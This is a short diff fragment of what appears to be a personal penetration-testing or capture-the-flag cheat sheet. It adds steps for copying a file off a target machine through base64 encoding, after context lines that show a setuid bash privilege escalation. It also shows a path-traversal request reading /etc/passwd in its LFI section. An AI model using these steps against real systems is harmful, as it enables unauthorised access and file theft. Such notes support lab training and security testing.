@@ -25,6 +25,13 @@ reset
    ./bash -p
    whoami
 
+5. (YOU CANT TAKE A FILE FROM TARGETS MACHINE WITH PYTHON SERVER)
+   a. cat filename|base64   (copy it)
+   b. nano name.base64     (and put it inside)
+   c. cat name.base64|base64 -d>name   (and now you have it at your machine)
+
+   
+
 --------------------LFI---------------------
 1. (throught pdf export/download) (known exploitable files: https://github.com/hussein98d/LFI-files/blob/master/list.txt):
    --> (burpsuite) GET /download?filename=../../../../../etc/passwd HTTP/1.1
